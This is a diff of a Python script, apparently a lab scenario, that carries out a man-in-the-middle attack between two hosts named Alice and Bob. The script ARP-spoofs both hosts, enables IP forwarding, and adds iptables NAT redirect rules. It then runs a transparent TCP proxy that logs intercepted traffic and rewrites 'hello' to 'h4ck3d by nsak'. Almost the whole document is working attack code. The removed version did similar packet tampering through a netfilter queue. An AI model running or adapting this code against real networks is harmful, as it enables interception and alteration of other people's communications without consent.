@@ -1,20 +1,25 @@
 """
 scenario entrypoint for mitm.
 """
-
-from typing import Callable
+import socket
+import struct
+import threading
 
 from scapy.layers.inet import TCP, IP
-from scapy.packet import Raw, Packet as ScapyPacket
-from netfilterqueue import NetfilterQueue, Packet
+from scapy.packet import Raw, Packet
 
 import subprocess
 from scapy.all import get_if_hwaddr
 
+SO_ORIGINAL_DST = 80  # from linux/netfilter_ipv4.h
+PORT = 5000
 ALICE_IP = "10.10.10.20"
 BOB_IP = "10.10.10.30"
+ATTACKER_IP = "10.10.10.10"
+LISTEN_IP = "0.0.0.0"
 ATTACKER_IFACE = "eth0"
 ATTACKER_MAC = get_if_hwaddr(ATTACKER_IFACE)
+
 
 def set_ip_forwarding(value: bool) -> None:
     """
@@ -27,85 +32,39 @@ def set_ip_forwarding(value: bool) -> None:
     with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
         f.write(str_value)
 
-def print_packet(ip: ScapyPacket) -> None:
-    """
 
-
-    :param ip:
-    :return:
-    """
-    if IP in ip and TCP in ip:
-        src = ip[IP].src
-        dst = ip[IP].dst
-        payload = bytes(ip[TCP].payload)
-        if payload:
-            try:
-                payload = payload.decode(errors="replace")
-            except Exception:
-                payload = "<binary>"
-            print(f"[MITM] {src} → {dst}: {payload}", flush=True)
-
-def manipulate_packet(packet: Packet) -> None:
-    """
-    Intercept and manipulate packets.
-
-    :param packet:
-    :return:
-    """
-    ip = IP(packet.get_payload())
-
-    # print("[+] Received packet...")
-    print_packet(ip)
-
-    if ip.haslayer(Raw):
-        #print("[+] Packet contains raw payload, manipulating...", flush=True)
-        payload: bytes = ip[Raw].load
-        #print(f"[+] Raw payload: {payload} ({type(payload)})", flush=True)
-
-        print("[+] Modifying packet", flush=True)
-
-        new_payload = payload.replace(b"says hello", b"H4X0R nsak")
-
-        ip[Raw].load = new_payload
-
-        del ip[IP].len
-        del ip[IP].chksum
-        del ip[TCP].chksum
-
-    packet.set_payload(bytes(ip))
-    packet.accept()
-
-def setup_netfilter_iptables() -> None:
+def setup_iptables() -> None:
     """
     Setup iptables rules for forwarding packets to netfilter queue.
 
     :return:
     """
+    address = f"{ATTACKER_IP}:{PORT}"
 
-    subprocess.Popen([
+    subprocess.run([
         "iptables",
-        "-I",
-        "FORWARD",
-        "-p",
-        "tcp",
-        "--dport",
-        "5000",
-        "-j",
-        "NFQUEUE",
-        "--queue-num",
-        "1"
-    ])
+        "-A", "FORWARD",
+        "-i", ATTACKER_IFACE,
+        "-o", ATTACKER_IFACE,
+        "-j", "ACCEPT"
+    ], check=True)
+    subprocess.run([
+        "iptables", "-t", "nat",
+        "-A", "PREROUTING",
+        "-i", ATTACKER_IFACE,
+        "-p", "tcp",
+        "!", "-s", ATTACKER_IP,
+        "-j", "REDIRECT",
+        "--to-ports", str(PORT)
+    ], check=True)
+    subprocess.run([
+        "iptables",
+        "-A", "INPUT",
+        "-p", "tcp",
+        "--dport", str(PORT),
+        "-j", "ACCEPT"
+    ], check=True)
 
-def setup_netfilter_queue(packet_handler: Callable[[Packet], None]) -> None:
-    """
-    Setup netfilter queue for intercepting packets.
-
-    :param packet_handler:
-    :return:
-    """
-    netfilter_queue = NetfilterQueue()
-    netfilter_queue.bind(1, packet_handler)
-    netfilter_queue.run()
 
 def arp_spoof(iface: str, target_ip: str, spoof_ip: str) -> None:
     """
@@ -119,6 +78,72 @@ def arp_spoof(iface: str, target_ip: str, spoof_ip: str) -> None:
     subprocess.Popen(["arpspoof", "-i", iface, "-t", target_ip, spoof_ip])
 
 
+def get_original_address(sock: socket.socket) -> tuple[str, int]:
+    """
+
+
+    :param sock:
+    :return:
+    """
+    data = sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
+    _, port, raw_ip = struct.unpack("!HH4s8x", data)
+    ip = socket.inet_ntoa(raw_ip)
+    return ip, port
+
+
+def forward_tcp_connection(source: socket.socket, destination: socket.socket) -> None:
+    """
+
+
+    :param source:
+    :param destination:
+    :return:
+    """
+    print(f"[+] Forwarding connection from {source.getpeername()} to {destination.getpeername()}")
+
+    while True:
+        data = source.recv(4096)
+        if not data:
+            break
+
+        print(data.decode(), flush=True)
+        data = data.replace(b"hello", b"h4ck3d by nsak")
+        destination.sendall(data)
+
+    source.close()
+    destination.close()
+
+
+def terminate_tcp_connection(client: socket.socket) -> None:
+    """
+
+    :return:
+    """
+    address = get_original_address(client)
+    print(f"[+] Terminating connection to {address}")
+    server = socket.create_connection(address)
+
+    threading.Thread(target=forward_tcp_connection, args=(client, server)).start()
+    threading.Thread(target=forward_tcp_connection, args=(server, client)).start()
+
+
+def setup_tcp_proxy() -> None:
+    """
+
+
+    :return:
+    """
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind((LISTEN_IP, PORT))
+    sock.listen()
+
+    print("[+] MITM TCP proxy listening")
+
+    while True:
+        client, _ = sock.accept()
+        terminate_tcp_connection(client)
+
+
 def run() -> None:
     """
     Scenario, which runs MITM attack, based on arp spoofing.
@@ -127,10 +152,10 @@ def run() -> None:
     """
 
     set_ip_forwarding(True)
+    setup_iptables()
     arp_spoof(ATTACKER_IFACE, ALICE_IP, BOB_IP)
     arp_spoof(ATTACKER_IFACE, BOB_IP, ALICE_IP)
-    setup_netfilter_iptables()
-    setup_netfilter_queue(manipulate_packet)
+    setup_tcp_proxy()
 
 
 if __name__ == "__main__":
